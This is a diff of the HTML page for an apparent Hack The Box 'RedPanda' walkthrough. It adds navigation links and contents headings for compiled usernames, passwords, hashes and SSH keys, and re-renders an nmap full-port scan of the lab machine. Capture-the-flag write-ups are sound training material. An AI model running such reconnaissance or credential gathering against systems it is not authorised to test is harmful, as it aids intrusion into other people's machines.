@@ -80,8 +80,8 @@
             
             <link
                 rel="stylesheet"
-                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
-                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
+                href="/_theme/css/01_layout.64370b5236f2e674ebb17408e79404f05d1c6ff7de5628950eb18b15ec63cd07d9697828372ccf6ae36148e595c4ce3a3c9dc4f6239149ec7ddaaf894f59825c.css"
+                integrity="sha512-ZDcLUjby5nTrsXQI55QE8F0cb/feViiVDrGLFexjzQfZaXgoNyzPauNhSOWVxM46PJ3E9iORSex92q&#43;JT1mCXA==" />
         
             
             <link
@@ -183,6 +183,26 @@
 
 
     <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/escapetwo-box/" title="./walkthroughs/escapetwo-box/">
+                        
+                            EscapeTwo HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/redpanda-box/" title="./walkthroughs/redpanda-box/">
+                        
+                            RedPanda HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
         
             
                 <li class="file">
@@ -772,8 +792,8 @@
                     <div class="date" title="Date">
                         <i class="bi bi-calendar3"></i>
                         <time
-                            datetime="2025.12.01"
-                            >2025.12.01
+                            datetime="2024.10.10"
+                            >2024.10.10
                         </time>
                     </div>
                 
@@ -948,6 +968,12 @@
       </ul>
     </li>
     <li><a href="#sign-off">Sign off:</a></li>
+    <li><a href="#9c69d6"><del>CREDS</del>:</a>
+      <ul>
+        <li><a href="#compiled-usernames-passwords-and-hashes">Compiled Usernames, Passwords &amp; Hashes:</a></li>
+        <li><a href="#ssh-keys">SSH Keys:</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
         
@@ -1069,55 +1095,55 @@
     
 
     
-        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>  kali in HTB/BlogEntriesMade/RedPanda/scans/nmap  🍣 main  3GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  kali in HTB/BlogEntriesMade/RedPanda/scans/nmap  🍣 main  3GiB/7GiB | 0B/1GiB with /usr/bin/zsh
 </span></span><span style="display:flex;"><span>  🕙 15:19:23 zsh ❯ sudo nmap -p- -sV -sC -O --disable-arp-ping $box -oA FullTCP
-</span></span><span style="display:flex;"><span>  [sudo] password for kali:
-</span></span><span style="display:flex;"><span>  Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 15:19 GMT
-</span></span><span style="display:flex;"><span>  Nmap scan report for 10.129.227.207
-</span></span><span style="display:flex;"><span>  Host is up (0.038s latency).
-</span></span><span style="display:flex;"><span>  Not shown: 65451 closed tcp ports (reset), 82 filtered tcp ports (no-response)
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:
+</span></span><span style="display:flex;"><span>  Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-12-27 15:19 GMT
+</span></span><span style="display:flex;"><span>  Nmap scan report <span style="color:#66d9ef">for</span> 10.129.227.207
+</span></span><span style="display:flex;"><span>  Host is up <span style="color:#f92672">(</span>0.038s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  Not shown: <span style="color:#ae81ff">65451</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>, <span style="color:#ae81ff">82</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>  PORT     STATE SERVICE    VERSION
-</span></span><span style="display:flex;"><span>  22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>  22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>  | ssh-hostkey:
-</span></span><span style="display:flex;"><span>  |   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
-</span></span><span style="display:flex;"><span>  |   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
-</span></span><span style="display:flex;"><span>  |_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+</span></span><span style="display:flex;"><span>  |   <span style="color:#ae81ff">3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  |   <span style="color:#ae81ff">256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  |_  <span style="color:#ae81ff">256</span> 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>  8080/tcp open  http-proxy
 </span></span><span style="display:flex;"><span>  |_http-title: Red Panda Search | Made with Spring Boot
 </span></span><span style="display:flex;"><span>  |_http-open-proxy: Proxy might be redirecting requests
 </span></span><span style="display:flex;"><span>  | fingerprint-strings:
 </span></span><span style="display:flex;"><span>  |   GetRequest:
-</span></span><span style="display:flex;"><span>  |     HTTP/1.1 200
-</span></span><span style="display:flex;"><span>  |     Content-Type: text/html;charset=UTF-8
+</span></span><span style="display:flex;"><span>  |     HTTP/1.1 <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>  |     Content-Type: text/html;charset<span style="color:#f92672">=</span>UTF-8
 </span></span><span style="display:flex;"><span>  |     Content-Language: en-US
-</span></span><span style="display:flex;"><span>  |     Date: Fri, 27 Dec 2024 15:20:47 GMT
+</span></span><span style="display:flex;"><span>  |     Date: Fri, <span style="color:#ae81ff">27</span> Dec <span style="color:#ae81ff">2024</span> 15:20:47 GMT
 </span></span><span style="display:flex;"><span>  |     Connection: close
-</span></span><span style="display:flex;"><span>  |     <span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
-</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span> <span style="color:#a6e22e">dir</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ltr&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">head</span>&gt;
-</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">author</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;wooden_k&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>  |     <span style="color:#75715e">&lt;!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw --&gt;</span>
-</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;css/panda.css&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;css/main.css&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">title</span>&gt;Red Panda Search | Made with Spring Boot&lt;/<span style="color:#f92672">title</span>&gt;
-</span></span><span style="display:flex;"><span>  |     &lt;/<span style="color:#f92672">head</span>&gt;
-</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">body</span>&gt;
-</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;pande&#39;</span>&gt;
-</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ear left&#39;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
-</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ear right&#39;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
-</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;whiskers left&#39;</span>&gt;
-</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
-</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
-</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
-</span></span><span style="display:flex;"><span>  |     &lt;/<span style="color:#f92672">div</span>&gt;
-</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;whiskers right&#39;</span>&gt;
-</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
-</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
-</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
-</span></span><span style="display:flex;"><span>  |     &lt;/<span style="color:#f92672">div</span>&gt;
-</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;face&#39;</span>&gt;
-</span></span><span style="display:flex;"><span>  |     &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;eye
+</span></span><span style="display:flex;"><span>  |     &lt;!DOCTYPE html&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span> dir<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ltr&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;head&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;meta author<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;wooden_k&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw --&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;css/panda.css&#34;</span> type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;css/main.css&#34;</span> type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;title&gt;Red Panda Search | Made with Spring Boot&lt;/title&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;/head&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;body&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;pande&#39;</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ear left&#39;</span>&gt;&lt;/div&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ear right&#39;</span>&gt;&lt;/div&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;whiskers left&#39;</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;span&gt;&lt;/span&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;span&gt;&lt;/span&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;span&gt;&lt;/span&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;/div&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;whiskers right&#39;</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;span&gt;&lt;/span&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;span&gt;&lt;/span&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;span&gt;&lt;/span&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;/div&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;face&#39;</span>&gt;
+</span></span><span style="display:flex;"><span>  |     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;eye
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  |   HTTPOptions:
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  |     HTTP/1.1 200
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  |     Allow: GET,HEAD,OPTIONS
@@ -1147,40 +1173,40 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:0\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;css/main\.css\&#34;\x20type=\&#34;te
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:xt/css\&#34;&gt;\n\x20\x20\x20\x20&lt;title&gt;Red\x20Panda\x20Search\x20\|\x20Made\
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:x20with\x20Spring\x20Boot&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x20&lt;body&gt;\n\n\
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:x20\x20\x20\x20&lt;div\x20class=&#39;</span><span style="color:#a6e22e">pande</span><span style="color:#960050;background-color:#1e0010">&#39;</span>&gt;\n\x20\x20\x20\x20\x20\x20&lt;<span style="color:#f92672">div</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">SF:class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ear\x20left&#39;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;\n\x20\x20\x20\x20\x20\x20&lt;<span style="color:#f92672">div</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ear\
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:x20right&#39;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;\n\x20\x20\x20\x20\x20\x20&lt;<span style="color:#f92672">div</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;whiskers\x20le
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:ft&#39;</span>&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&lt;<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;\n\x20\x20\x
-</span></span><span style="display:flex;"><span>  SF:20\x20\x20\x20\x20\x20\x20\x20&lt;<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;\n\x20\x20\x20\x20\x20\x20\x
-</span></span><span style="display:flex;"><span>  SF:20\x20\x20\x20&lt;<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;\n\x20\x20\x20\x20\x20\x20&lt;/<span style="color:#f92672">div</span>&gt;\n\x20\x20\x
-</span></span><span style="display:flex;"><span>  SF:20\x20\x20\x20&lt;<span style="color:#f92672">div</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;whiskers\x20right&#39;</span>&gt;\n\x20\x20\x20\x20\x20\
-</span></span><span style="display:flex;"><span>  SF:x20\x20\x20&lt;<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
-</span></span><span style="display:flex;"><span>  SF:\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;\n\x20\x20\x20\x20\x20\x
-</span></span><span style="display:flex;"><span>  SF:20&lt;/<span style="color:#f92672">div</span>&gt;\n\x20\x20\x20\x20\x20\x20&lt;<span style="color:#f92672">div</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;face&#39;</span>&gt;\n\x20\x20\x20\x
-</span></span><span style="display:flex;"><span>  SF:20\x20\x20\x20\x20&lt;<span style="color:#f92672">div</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;eye&#34;)%r(HTTPOptions,75,&#34;HTTP/1\.1\x202</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">SF:00</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">nAllow:</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20GET</span><span style="color:#960050;background-color:#1e0010">,</span><span style="color:#a6e22e">HEAD</span><span style="color:#960050;background-color:#1e0010">,</span><span style="color:#a6e22e">OPTIONS</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">nContent-Length:</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x200</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">nDate:</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">SF:20Fri</span><span style="color:#960050;background-color:#1e0010">,\</span><span style="color:#a6e22e">x2027</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20Dec</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x202024</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x2015:20:47</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20GMT</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">nConnection:</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20close</span><span style="color:#960050;background-color:#1e0010">\</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">SF:r</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">n</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">n</span><span style="color:#960050;background-color:#1e0010">&#34;)%</span><span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">RTSPRequest</span><span style="color:#960050;background-color:#1e0010">,</span><span style="color:#a6e22e">24E</span><span style="color:#960050;background-color:#1e0010">,&#34;</span><span style="color:#a6e22e">HTTP</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">1</span><span style="color:#960050;background-color:#1e0010">\.</span><span style="color:#a6e22e">1</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20400</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">nContent-Type:</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20t</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">SF:ext</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">html</span><span style="color:#960050;background-color:#1e0010">;</span><span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x2</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">SF:0435</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">nDate:</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20Fri</span><span style="color:#960050;background-color:#1e0010">,\</span><span style="color:#a6e22e">x2027</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20Dec</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x202024</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x2015:20:47</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20GMT</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">nConnec</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">SF:tion:</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20close</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">n</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">n</span><span style="color:#960050;background-color:#1e0010">&lt;!</span><span style="color:#a6e22e">doctype</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20html</span>&gt;&lt;<span style="color:#f92672">html</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;en\&#34;</span>&gt;&lt;<span style="color:#f92672">head</span>&gt;&lt;<span style="color:#f92672">tit</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">SF:le</span>&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request&lt;/<span style="color:#f92672">title</span>&gt;&lt;<span style="color:#f92672">styl</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">SF:e</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20type</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;text/css\&#34;</span>&gt;body\x20{font-family:Tahoma,Arial,sans-serif;}\x
-</span></span><span style="display:flex;"><span>  SF:20h1,\x20h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20
-</span></span><span style="display:flex;"><span>  SF:h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:
-</span></span><span style="display:flex;"><span>  SF:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{h
-</span></span><span style="display:flex;"><span>  SF:eight:1px;background-color:#525D76;border:none;}&lt;/<span style="color:#f92672">style</span>&gt;&lt;/<span style="color:#f92672">head</span>&gt;&lt;<span style="color:#f92672">body</span>&gt;&lt;<span style="color:#f92672">h</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">SF:1</span>&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request&lt;/<span style="color:#f92672">h1</span>&gt;&lt;/<span style="color:#f92672">body</span>&gt;&lt;/
-</span></span><span style="display:flex;"><span>  <span style="color:#f92672">SF:html</span>&gt;&#34;);
-</span></span><span style="display:flex;"><span>  Device type: general purpose
-</span></span><span style="display:flex;"><span>  Running: Linux 5.X
-</span></span><span style="display:flex;"><span>  OS CPE: cpe:/o:linux:linux_kernel:5.0
-</span></span><span style="display:flex;"><span>  OS details: Linux 5.0
-</span></span><span style="display:flex;"><span>  Network Distance: 2 hops
-</span></span><span style="display:flex;"><span>  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span style="display:flex;"><span>  Nmap done: 1 IP address (1 host up) scanned in 66.89 seconds</span></span></code></pre></div>
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:x20\x20\x20\x20&lt;div\x20class=&#39;</span>pande<span style="color:#e6db74">&#39;&gt;\n\x20\x20\x20\x20\x20\x20&lt;div\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:class=&#39;</span>ear<span style="color:#ae81ff">\x</span>20left<span style="color:#e6db74">&#39;&gt;&lt;/div&gt;\n\x20\x20\x20\x20\x20\x20&lt;div\x20class=&#39;</span>ear<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  SF:x20right<span style="color:#e6db74">&#39;&gt;&lt;/div&gt;\n\x20\x20\x20\x20\x20\x20&lt;div\x20class=&#39;</span>whiskers<span style="color:#ae81ff">\x</span>20le
+</span></span><span style="display:flex;"><span>  SF:ft<span style="color:#e6db74">&#39;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:20\x20\x20\x20\x20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x20\x20\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x20\x20\x20&lt;/div&gt;\n\x20\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:20\x20\x20\x20&lt;div\x20class=&#39;</span>whiskers<span style="color:#ae81ff">\x</span>20right<span style="color:#e6db74">&#39;&gt;\n\x20\x20\x20\x20\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;span&gt;&lt;/span&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x20\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:20&lt;/div&gt;\n\x20\x20\x20\x20\x20\x20&lt;div\x20class=&#39;</span>face<span style="color:#e6db74">&#39;&gt;\n\x20\x20\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SF:20\x20\x20\x20\x20&lt;div\x20class=&#39;</span>eye<span style="color:#e6db74">&#34;)%r(HTTPOptions,75,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">202</span>
